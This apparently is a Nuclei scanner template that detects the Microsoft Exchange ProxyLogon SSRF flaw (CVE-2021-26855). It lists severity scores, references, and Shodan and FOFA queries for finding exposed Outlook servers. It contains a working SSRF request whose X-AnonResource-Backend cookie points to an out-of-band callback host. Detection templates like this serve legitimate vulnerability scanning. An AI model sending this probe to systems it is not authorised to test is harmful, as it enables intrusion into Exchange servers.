id: CVE-2021-26855

info:
  name: Microsoft Exchange Server SSRF Vulnerability
  author: madrobot
  severity: critical
  description: This vulnerability is part of an attack chain that could allow remote code execution on Microsoft Exchange Server. The initial attack requires the ability to make an untrusted connection to Exchange server port 443. Other portions of the chain can be triggered if an attacker already has access or can convince an administrator to open a malicious file. Be aware his CVE ID is unique from CVE-2021-26412, CVE-2021-26854, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065, and CVE-2021-27078.
  impact: |
    Successful exploitation of this vulnerability could lead to unauthorized access to sensitive information, remote code execution, or further compromise of the affected system.
  remediation: Apply the appropriate security update.
  reference:
    - https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-26855
    - https://proxylogon.com/#timeline
    - https://web.archive.org/web/20210306113850/https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse
    - https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26855
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2021-26855
    cwe-id: CWE-918
    epss-score: 0.97507
    epss-percentile: 0.9998
    cpe: cpe:2.3:a:microsoft:exchange_server:2013:cumulative_update_21:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: microsoft
    product: exchange_server
    shodan-query:
      - vuln:CVE-2021-26855
      - http.favicon.hash:1768726119
      - http.title:"outlook"
      - cpe:"cpe:2.3:a:microsoft:exchange_server"
    fofa-query:
      - title="outlook"
      - icon_hash=1768726119
    google-query: intitle:"outlook"
  tags: cve2021,cve,ssrf,rce,exchange,oast,microsoft,kev

http:
  - raw:
      - |
        GET /owa/auth/x.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-AnonResource=true; X-AnonResource-Backend={{interactsh-url}}/ecp/default.flt?~3;

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
# digest: 490a0046304402202e7701433273f6ac2ffbadb3dd4d12cde60d4f9e97e0b6c0424598d9cc86d71102207860f61cfe62ba3e8d8d270ecd6207e4dd74dbc61f3b794ad01a8bc0dc4de778:922c64590222798bb761d5b6d8e72950